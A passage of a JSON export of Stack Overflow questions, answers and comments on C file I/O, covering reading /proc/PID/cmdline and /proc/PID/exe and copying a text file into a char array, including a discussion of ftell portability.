noreferrer\"><code>readlink()</code></a> on <code>&#47;proc&#47;PID&#47;exe</code> instead."}, {"owner": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "reply_to_user": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1518579701, "post_id": 48778826, "comment_id": 84560210, "body": "@NominalAnimal I am not allowed to use readlink() or any system calls. If there are arguments following the path, how would I go about getting the path only?"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1518814975, "post_id": 48778826, "comment_id": 84674228, "body": "@Bill: <code>readlink()</code> is not a system call, it&#39;s a standard POSIX.1 C function, which is used to obtain the path a symlink points to."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "edited": false, "score": 0, "creation_date": 1518578760, "post_id": 48778962, "comment_id": 84559960, "body": "I put your path in a cmdline file I created for testing along with some arguments : &quot;/usr/bin/gvim arg1 arg2 arg3&quot;. However, the code prints the entire string and does not print &quot;/usr/bin/gvim&quot;."}, {"owner": {"reputation": 22623, "user_id": 147175, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/PyWe3.jpg?s=128&g=1", "display_name": "Scott Stensland", "link": "https://stackoverflow.com/users/147175/scott-stensland"}, "reply_to_user": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "edited": false, "score": 0, "creation_date": 1518582192, "post_id": 48778962, "comment_id": 84560867, "body": "@Bill   it will show just what is executed ... so if you execute giving full path to gvim it will show full path ... its instructive to issue a directory listing on your proc in question from a terminal to view alternative attributes other than cmdline ... as per  ls -la /proc/10979   ... here you will see   ls -la  /proc/10979/exe    ... unless there is a shortcut to obtain the full path to cmd I would say you can resolve it by first obtaining the PATH of the pid to then discover the cmd location ... UPDATE checkout this readlink -f /proc/15870/exe  which gives you full path"}, {"owner": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "reply_to_user": {"reputation": 22623, "user_id": 147175, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/PyWe3.jpg?s=128&g=1", "display_name": "Scott Stensland", "link": "https://stackoverflow.com/users/147175/scott-stensland"}, "edited": false, "score": 0, "creation_date": 1518587346, "post_id": 48778962, "comment_id": 84562370, "body": "@ScottStensland Would fread detect the first null terminator as well?"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "edited": false, "score": 0, "creation_date": 1518601878, "post_id": 48778962, "comment_id": 84569599, "body": "@Bill probably yes, I haven&#39;t tested it. But you can test it. --- <i>I put your path in a cmdline file I created for testing along with some arguments</i> where did you put that? Note that this only works because <code>&#47;proc&#47;&lt;pid&gt;&#47;cmdline</code> uses <code>&#39;\\0&#39;</code> as separator."}], "tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 2, "last_activity_date": 1518577395, "last_edit_date": 1518577395, "creation_date": 1518577051, "answer_id": 48778962, "question_id": 48778826, "link": "https://stackoverflow.com/questions/48778826/c-extracting-info-from-file-in-proc/48778962#48778962", "title": "C extracting info from file in /proc", "body": "<p>Don't use <code>fscanf</code> for this, if the command name has a space in it, you won't\nget the whole name.</p>\n\n<p>You can use <code>fgets</code>, it will stop reading at the <code>'\\0'</code>. I have right now a\nprocess running with pid 10979:</p>\n\n<pre><code>FILE *fp = fopen(\"/proc/10979/cmdline\", \"r\");\n\nchar line[1024];\nfgets(line, sizeof line, fp);\n\nputs(line);\n\nfclose(fp);\n</code></pre>\n\n<p>This prints:</p>\n\n<pre><code>/usr/bin/gvim\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "is_accepted": false, "score": 0, "last_activity_date": 1518814932, "creation_date": 1518814932, "answer_id": 48834793, "question_id": 48778826, "link": "https://stackoverflow.com/questions/48778826/c-extracting-info-from-file-in-proc/48834793#48834793", "title": "C extracting info from file in /proc", "body": "<ol>\n<li><p><code>/proc/PID/cmdline</code> contains the command line used to execute the program (unless modified by the program itself). It does not contain the path to the executable; it only contains the path used to execute it.</p>\n\n<p>For example, if you execute <code>foo bar baz</code>, its <code>/proc/PID/cmdline</code> will contain <code>foo\\0bar\\0baz\\0</code>.</p>\n\n<p>You can use e.g. <a href=\"http://man7.org/linux/man-pages/man3/getdelim.3.html\" rel=\"nofollow noreferrer\"><code>getdelim()</code></a> with <code>'\\0'</code> as the delimiter to read the path to the executable.<br>&nbsp;</p></li>\n<li><p>To get the actual path of the executable, examine the <code>/proc/PID/exe</code> symlink. It will always point to the executable.</p>\n\n<p>To read the symlink, you can use the POSIX.1 <a href=\"http://man7.org/linux/man-pages/man2/readlink.2.html\" rel=\"nofollow noreferrer\"><code>readlink()</code></a> function provided by the C library.</p>\n\n<p>I have an example implementation <a href=\"https://stackoverflow.com/a/24582217/1475978\">in this answer</a>.</p>\n\n<p>In Linux, there is a kernel \"bug\": if an executable is very deep in the filesystem hierarchy, the <code>readlink()</code> call on the <code>/proc/PID/exe</code> pseudo-symlink fails with <code>ENAMETOOLONG</code> error.<br>&nbsp;</p></li>\n<li><p>The path to the executable can also be extracted from <code>/proc/PID/stat</code>.</p>\n\n<p>The name of the executable is between the first <code>(</code> and last <code>)</code> in that pseudo-file.</p>\n\n<p>You can use <a href=\"http://man7.org/linux/man-pages/man3/getline.3.html\" rel=\"nofollow noreferrer\"><code>getline()</code></a> to read the entire line (entire pseudofile, actually, because it only contains a newline at end), <a href=\"http://man7.org/linux/man-pages/man3/strchr.3.html\" rel=\"nofollow noreferrer\"><code>strchr()</code></a> to locate the first <code>(</code> in it, and <a href=\"http://man7.org/linux/man-pages/man3/strrchr.3.html\" rel=\"nofollow noreferrer\"><code>strrchr()</code></a> to locate the last <code>)</code>.<br>&nbsp;</p></li>\n</ol>\n\n<p>If you want to experiment with funny/nasty executable names, just run e.g.</p>\n\n<pre><code>ln -s /bin/cat $'foo)\\nbar\\n('\n$'./foo)\\nbar\\n(' /proc/self/stat\nrm $'foo)\\nbar\\n('\n</code></pre>\n\n<p>in Bash, and examine the contents of <code>/proc/self/stat</code>.</p>\n"}], "owner": {"reputation": 11, "user_id": 9352855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/755df9333367ec800725eff31fbf9e68?s=128&d=identicon&r=PG&f=1", "display_name": "Bill", "link": "https://stackoverflow.com/users/9352855/bill"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1709, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518814932, "creation_date": 1518575872, "question_id": 48778826, "link": "https://stackoverflow.com/questions/48778826/c-extracting-info-from-file-in-proc", "title": "C extracting info from file in /proc", "body": "<p>I am trying to get the path which contains the executable of a PID from /proc/pid/cmdline in C. The man page states:</p>\n\n<p>\"The command-line arguments appear\n              in this file as a set of strings separated by null bytes\n              ('\\0'), with a further null byte after the last string.\"</p>\n\n<p>My idea (pseudocode):</p>\n\n<pre><code>int main(int argc, char** argv){\n    // Assume file_path has been initialized\n    char executable_path[1000];\n    FILE* file = fopen(file_path, \"r\");\n    if(f != NULL){\n\n        fscanf(\"%s\", executable_path);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Since I only want the first string from this file(since that is the path containing the executable) and I know for sure that there is a '\\0' after the first string, would fscanf be the correct function to use? Will it detect the first '\\0' and then store the whole string up to the first '\\0' in the executable_path array? (Note: I don't need to extract any of the other strings).</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["c", "arrays", "file", "io"], "comments": [{"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1518574383, "post_id": 48778627, "comment_id": 84558930, "body": "Don&#39;t use fscanf for this, use fread."}, {"owner": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1518574416, "post_id": 48778627, "comment_id": 84558935, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/3747086/reading-the-whole-text-file-into-a-char-array-in-c\">Reading the whole text file into a char array in C</a>"}, {"owner": {"reputation": 33, "user_id": 8821668, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/WVlBb.jpg?s=128&g=1", "display_name": "Midge_Mong", "link": "https://stackoverflow.com/users/8821668/midge-mong"}, "edited": false, "score": 0, "creation_date": 1518574741, "post_id": 48778627, "comment_id": 84559013, "body": "@I&#39;L&#39;I I checked out the linked post and am now receiving the &quot;entire read fails&quot; error"}, {"owner": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1518576009, "post_id": 48778627, "comment_id": 84559302, "body": "No worries, thought it might be of use \u2014 glad you got it sorted."}], "answers": [{"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518606389, "post_id": 48778764, "comment_id": 84572612, "body": "This code is not reliable.  <code>fp = fopen(&quot;test.txt&quot;, &quot;r&quot;);</code> opens the file in text mode.  But <code>ftell()</code> on a stream in text mode does not return the number of bytes in the file, or even the number of bytes that can be read from the file.  Per <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.21.9.4p2\" rel=\"nofollow noreferrer\"><b>7.21.9.4  The <code>ftell</code> function</b>, paragraph 2</a> of <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">the C standard</a>:"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518606404, "post_id": 48778764, "comment_id": 84572624, "body": "(cont)  &quot;For a text stream, its file position indicator contains unspecified information, usable by the <code>fseek</code> function for returning the file position indicator for the stream  to  its  position  at  the  time  of  the <code>ftell</code> call;  the  difference  between  two  such return values is <b>not necessarily a meaningful measure of the number of characters written read</b>&quot;  For example, on Windows <code>file[f_length] = 0; &#47;&#47; terminate the string</code> will not properly terminate the string."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518612816, "post_id": 48778764, "comment_id": 84576996, "body": "@AndrewHenle this is new to me, I&#39;ve read the <code>ftell</code> man page on my system at work (debian 8) and the page does not mention this at all. I&#39;ve been doing this on linux for years without a problem. In fact  in Linux <code>b</code> is ignored (my man page even says <i>all POSIX conforming systems</i>) . To be portable, what would you suggest, <code>fopen(&quot;test.txt&quot;, &quot;rb&quot;);</code>?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518613295, "post_id": 48778764, "comment_id": 84577311, "body": "@Pablo It works on Linux because Linux is (mostly) POSIX-compliant, and <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/ftell.html\" rel=\"nofollow noreferrer\">POSIX defines <code>ftell()</code> to return a byte offset</a>:  &quot;<code>ftell()</code> ... shall return the current value of the file-position indicator for the stream measured in bytes from the beginning of the file.&quot;  But there&#39;s <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.21.9.2p3\" rel=\"nofollow noreferrer\">a portability problem with <code>fseek()</code> on a binary stream</a>:  &quot;A binary stream need not meaningfully support <code>fseek</code> calls with a whence value of <code>SEEK_END</code>.&quot;"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518613430, "post_id": 48778764, "comment_id": 84577396, "body": "@Pablo (cont)  <a href=\"https://port70.net/~nsz/c/c11/n1570.html#note268\" rel=\"nofollow noreferrer\">Additionally</a>:  &quot;Setting the file position indicator to end-of-file, as with <code>fseek(file, 0, SEEK_END)</code>, has <b>undefined behavior for a binary stream</b> ...&quot;  So, there is no <i>portable</i> way that&#39;s strictly compliant with the C standard to get the size of a file other than to read it <code>char</code>-by-<code>char</code> and count them.  There are some downright <i>strange</i> storage systems out there..."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518613625, "post_id": 48778764, "comment_id": 84577507, "body": "@AndrewHenle Oh I see, I was also reading <a href=\"https://stackoverflow.com/a/2076043/1480131\">this</a> which basically says the same. So the only portable way of knowing how long you text file is, is by reading the whole file and count the characters yourself? Does that also mean that POSIX&#39;s <code>ftell</code> contradicts/behaves differently from the standard?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518615370, "post_id": 48778764, "comment_id": 84578634, "body": "@Pablo POSIX specifies byte offsets for <code>fseek()</code> and <code>ftell()</code>, <i>and</i> <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fopen.html\" rel=\"nofollow noreferrer\">POSIX <code>fopen()</code> states</a>: &quot;The character <code>&#39;b&#39;</code> shall have no effect ...<code>.  So POSIX streams are pure bytes with no character translation.  Windows also specifies bytes *but* translates between </code>&quot;\\n&quot;` in memory and <code>&quot;\\r\\n&quot;</code> on disk, which throws the byte counts off for streams not opened in binary mode.  So, yes, the only portable way to measure the size of file is to count bytes. But technically, you&#39;re just counting the number of bytes you can read."}], "tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": true, "score": 0, "last_activity_date": 1518575442, "creation_date": 1518575442, "answer_id": 48778764, "question_id": 48778627, "link": "https://stackoverflow.com/questions/48778627/copy-text-file-into-char-array/48778764#48778764", "title": "Copy text file into char* array", "body": "<p>You are calculating the length of the file but you don't use this information in\nany way.</p>\n\n<pre><code>char *f_array[256];\n</code></pre>\n\n<p>This is an array of dimension 256 of pointers to <code>char</code>. <code>f_array[i]</code> is\nuninitialized and it's pointing into the digital nirvana, passing it to\n<code>fscanf</code> yields undefined behaviour. You would need to declare it as something\nlike this:</p>\n\n<pre><code>char f_array[255][255];\n</code></pre>\n\n<p>But then you are limiting yourself to max 255 strings, you are not storing it\ninto a single string. Also you are storing max. 255 words. Use <code>fgets</code> or\n<code>fread</code> to get the whole content at once.</p>\n\n<pre><code>char file[f_length + 1];\n\nrewind(fp);\n\nfread(file, f_length, 1, fp);\n\nfile[f_length] = 0; // terminate the string\n\nprintf(\"Whole file is: %s\\n\", file);\n</code></pre>\n\n<p>Here you are storing the whole file in an array of <code>char</code>s. Also after setting\nthe file at the end, you'll need to rewind the file to the beginning, otherwise\nyou are not reading anything.</p>\n"}, {"comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518576292, "post_id": 48778803, "comment_id": 84559374, "body": "When explaining, please don&#39;t call it <i>&quot;array of arrays&quot;</i>, that&#39;s not an array of arrays, it&#39;s an array of pointers. That is huge difference. Calling it array of arrays is misleading. And the cast <code>(char) c</code> is unnecessary."}, {"owner": {"reputation": 3309, "user_id": 8730131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f156301e3a5cff2e8393aa0523f10d9c?s=128&d=identicon&r=PG&f=1", "display_name": "hunteke", "link": "https://stackoverflow.com/users/8730131/hunteke"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518576611, "post_id": 48778803, "comment_id": 84559435, "body": "@Pablo &quot;array of arrays&quot;: fair.  I wasn&#39;t focused on that particular detail, but the detail that his datatype wasn&#39;t fit for purpose.  Mea culpa.  Meanwhile, while answering, you beat me to it, so I&#39;m inclined to just delete my answer."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518576665, "post_id": 48778803, "comment_id": 84559443, "body": "don&#39;t delete the answer, it&#39;s a good answer. Someone might find yours more understandable than mine. Just update the bit with the &quot;array of arrays&quot;."}, {"owner": {"reputation": 3309, "user_id": 8730131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f156301e3a5cff2e8393aa0523f10d9c?s=128&d=identicon&r=PG&f=1", "display_name": "hunteke", "link": "https://stackoverflow.com/users/8730131/hunteke"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518577045, "post_id": 48778803, "comment_id": 84559524, "body": "@Pablo <code>(char) c</code> not necessary: That would be stale thinking as I was typing that up.  The compiler would throw a warning if not there.  But the real issue is that <code>int c</code> should be <code>char c</code>.  Fixed."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518577313, "post_id": 48778803, "comment_id": 84559592, "body": "No no, <code>c</code> should definitely be <code>int</code>, otherwise you will get problems when comparing with  <code>EOF</code>.  And I don&#39;t get any a warning with <code>char c = 10;</code> although 10 is an integer. That&#39;s not a problem."}, {"owner": {"reputation": 3309, "user_id": 8730131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f156301e3a5cff2e8393aa0523f10d9c?s=128&d=identicon&r=PG&f=1", "display_name": "hunteke", "link": "https://stackoverflow.com/users/8730131/hunteke"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518577499, "post_id": 48778803, "comment_id": 84559635, "body": "Huh, different compilers?  I definitely don&#39;t get a warning with <code>char c</code>, and do get a warning if <code>int c</code> and no cast.  GCC 5.4.0, <code>gcc -o test -Wall test.c</code>"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518577575, "post_id": 48778803, "comment_id": 84559655, "body": "I&#39;m using GCC 6.4.0, also with <code>-Wall</code>."}, {"owner": {"reputation": 3309, "user_id": 8730131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f156301e3a5cff2e8393aa0523f10d9c?s=128&d=identicon&r=PG&f=1", "display_name": "hunteke", "link": "https://stackoverflow.com/users/8730131/hunteke"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518577600, "post_id": 48778803, "comment_id": 84559662, "body": "Then newer is better, I suppose.  You win."}], "tags": [], "owner": {"reputation": 3309, "user_id": 8730131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f156301e3a5cff2e8393aa0523f10d9c?s=128&d=identicon&r=PG&f=1", "display_name": "hunteke", "link": "https://stackoverflow.com/users/8730131/hunteke"}, "is_accepted": false, "score": 1, "last_activity_date": 1518577684, "last_edit_date": 1518577684, "creation_date": 1518575734, "answer_id": 48778803, "question_id": 48778627, "link": "https://stackoverflow.com/questions/48778627/copy-text-file-into-char-array/48778803#48778803", "title": "Copy text file into char* array", "body": "<p>The issue is mainly to do with your data types.  You want to store the file in memory.  That would be a character (byte) array, but you have created an \"array of pointers\":</p>\n\n<pre><code>char *f_array[256];\n</code></pre>\n\n<p>When you probably wanted just:</p>\n\n<pre><code>char f_array[256];\n</code></pre>\n\n<p>Then, to do as you asked and read <em>character by character</em> into that array, use <code>fgetc</code>.  Note that <code>fgetc</code> will be far less efficient that just reading the whole file in a single function call with <code>fread</code>.  The kernel:</p>\n\n<pre><code>while ( EOF != (c = fgetc( fp )) &amp;&amp; ++i &lt; MAX_LEN )\n    f_array[ i ] = c;\n</code></pre>\n\n<p>In context of a working example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main ( ) {\n    const size_t MAX_LEN = 255;\n    FILE * fp;\n    char f_array[ MAX_LEN +1];\n    int c;\n    size_t i = -1;\n    f_array[ MAX_LEN +1] = 0;\n\n    fp = fopen(\"test.txt\",\"r\");\n\n    if ( NULL == fp )\n        perror(\"Error opening file\");\n    else {\n        while ( EOF != (c = fgetc( fp )) &amp;&amp; ++i &lt; MAX_LEN )\n            f_array[ i ] = c;\n\n        fclose (fp);\n    }\n    f_array[ i ] = 0;\n    printf(\"%zu bytes read\\n\\n\", i);\n    printf(\"Content read:\\n%s\\n\", f_array);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 8821668, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/WVlBb.jpg?s=128&g=1", "display_name": "Midge_Mong", "link": "https://stackoverflow.com/users/8821668/midge-mong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2062, "favorite_count": 0, "accepted_answer_id": 48778764, "answer_count": 2, "score": 0, "last_activity_date": 1518577684, "creation_date": 1518574193, "last_edit_date": 1518574416, "question_id": 48778627, "link": "https://stackoverflow.com/questions/48778627/copy-text-file-into-char-array", "title": "Copy text file into char* array", "body": "<pre><code>FILE *fp;\nchar *f_array[256];\nint f_length;\nint *a = 0;\n\nfp = fopen(\"test.txt\", \"r\");\nfseek(fp, 0, SEEK_END);\nf_length = ftell(fp);\nprintf(\"%d\\n\\n\", f_length);\nint n = 1, i = 0;\nwhile (n &gt; 0)\n{\n    n = fscanf(fp, \"%s\", f_array[i]);\n    i++;\n}\n</code></pre>\n\n<p>I am trying to copy the contents of a .txt file into a char* array. Much like what would happen with InternetReadFile and lpbuffer. However, I cannot seem to get this right. I need my array to be filled with the contents of the .txt file character by character. Any suggestions?\nI need the array to be single-dimensional</p>\n"}, {"tags": ["c", "csv", "printf", "scanf"], "comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518572072, "post_id": 48778352, "comment_id": 84558370, "body": "<code>if (fp == NULL) { perror (&quot;file open failed&quot;); exit (EXIT_FAILURE); }</code> Validate, validate, validate. You will want to look at <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\"><b>Why is while ( !feof (file) ) always wrong?</b></a>. For further help provide a <a href=\"http://stackoverflow.com/help/mcve\"><b>A Minimal, Complete, and Verifiable example</b></a>."}, {"owner": {"reputation": 172529, "user_id": 140750, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/4c7af12cad08c95bc206a9636d164224?s=128&d=identicon&r=PG", "display_name": "William Pursell", "link": "https://stackoverflow.com/users/140750/william-pursell"}, "edited": false, "score": 0, "creation_date": 1518572201, "post_id": 48778352, "comment_id": 84558398, "body": "You are using feof incorrectly:  <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\" title=\"why is while feof file always wrong\">stackoverflow.com/questions/5431941/&hellip;</a>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8859314"}, "edited": false, "score": 0, "creation_date": 1518573006, "post_id": 48778352, "comment_id": 84558592, "body": "But the main issue is while writing to the file additional commas are being added, how to fix that?"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1518573097, "post_id": 48778352, "comment_id": 84558626, "body": "<code>while(!feof(fp)){</code> - Please read <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\" title=\"why is while feof file always wrong\">stackoverflow.com/questions/5431941/&hellip;</a>"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1518573143, "post_id": 48778352, "comment_id": 84558636, "body": "Please read that <code>fscanf</code> returns a value as well- Google <code>man fsanf</code>"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": 